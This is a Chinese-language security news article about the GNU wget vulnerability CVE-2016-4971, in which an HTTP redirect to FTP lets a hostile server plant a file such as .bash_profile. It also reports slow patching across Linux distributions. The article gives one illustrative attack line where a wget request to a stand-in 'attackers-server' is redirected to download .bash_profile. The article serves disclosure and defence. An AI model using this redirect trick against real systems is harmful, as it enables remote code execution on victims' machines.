@@ -1,0 +1,59 @@
+
+---
+layout: post
+title: 所有Linux发行版仍未修复严重的GNU wget漏洞
+categories:
+- 今日头条
+tags:
+---
+				![](http://p1.pstatp.com/large/9e000070c4c7e7235d6)
+
+E安全7月8日讯 先前，安全研究员Dawid Golunski和SecuriTeam曝出GNU wget漏洞（CVE-2016-4971）。6月9日，GNU wget项目发布文件下载包新版1.18修复漏洞。
+
+CVE-2016-4971 漏洞回顾GUN wget 作为*nix 系统常用下载工具，支持http、https、ftp 等多种协议，当使用wget 下载文件时，若初始下载http服务提供的下载资源， 如果服务器将下载资源重定向到ftp服务时，wget 会默认信赖http服务器重定向的ftp 链接地址和文件名，而不做二次验证。从而可能下载到恶意钓鱼者的恶意文件，导致主机被入侵。
+
+将近一个月后，包含GNU wget标准包的所有Linux发行版仍未修复被曝漏洞（CVE-2016-4971）。
+
+GNU wget漏洞导致远程代码执行
+
+安全研究员Dawid Golunski在公告中解释道，恶意攻击者能诱骗wget文件下载过程在Linux设备上执行代码。
+
+Dawid Golunski通过电子邮件告诉外媒，“攻击者可能潜在滥用漏洞上传任意文件并执行代码。”
+
+![](http://p3.pstatp.com/large/9de00069a9f7669a0f3)
+
+GNU wget是从网络上自动下载文件的Linux命令行实用工具。如果链接发生变化，GNU wget支持URL重定向。
+
+当重定向到FTP链接时，GNU wget不重命名文件
+
+Golunski发现，当从最初的HTTP URL重定向到FTP链接时，wget不能正确处理文件名。
+
+比如，如果攻击者通过wget控制定期下载文件的服务器，攻击者可以使用302重定向文件。运行wget http://attackers-server/safe_file.txt命令的用户将被重定向到下载ftp://attackers-server/.bash_profile。
+
+在正常的HTTP重定向到HTTP中，为了防止远程代码执行（Remote Code Execution，缩写RCE），GNU wget将以原始文件名重命名第二个文件（.bash_profile to safe_file.txt）。然而，从HTTP重定向到FTP链接时，wget不包含该安全机制。这个问题影响打补丁1.18版本之前的所有GNU wget版本。
+
+因为wget命令经常用于大多数时候自动执行下载文件的脚本中，这就让攻击者有了可乘之机。所有系统管理员应审查将wget作为首选下载内容的Cronjobs。
+
+受影响的Linux发行版迟迟未修复
+
+虽然GNU wget项目履行了自己的职责，但一些Linux发行版却未及时更新。Golunski表示，只有Ubuntu将GNU wget1.18（如wget 1.17-1）包含在wget发行版更新中。Arch Linux等发行版自6月中旬就已修复了该问题。
+
+另一热门Linux OS—Debian特别配备了网络专家修复该问题。Wget 1.18目前包含在最新“测试”和“不稳定”版本中。
+
+另一方面，Red Hat已经推迟修复7.x中存在的该问题，同时还宣布未修复旧版6.x和5.x版本中的wget问题。
+
+虽然CVE-2016-4971安全隐患较高，但打补丁的速度也比较慢。
+
+研究人员通过电子邮件告诉外媒，“重要的是，wget发布了已经发布了新版1.18，因此，如果用户受影响且希望得到安全保障，他们可以下载官方资源。”
+
+Golunski和SecuriTeam已经发布了安全公告，内容包含漏洞与概念验证详情，以提高对问题的认识。
+
+E安全/文 转载请注明E安全
+
+E安全——全球网络安全新传媒
+
+E安全微信公众号： EAQapp
+
+E安全新浪微博：weibo.com/EAQapp
+
+E安全客服&投稿邮箱：eapp@easyaq.com
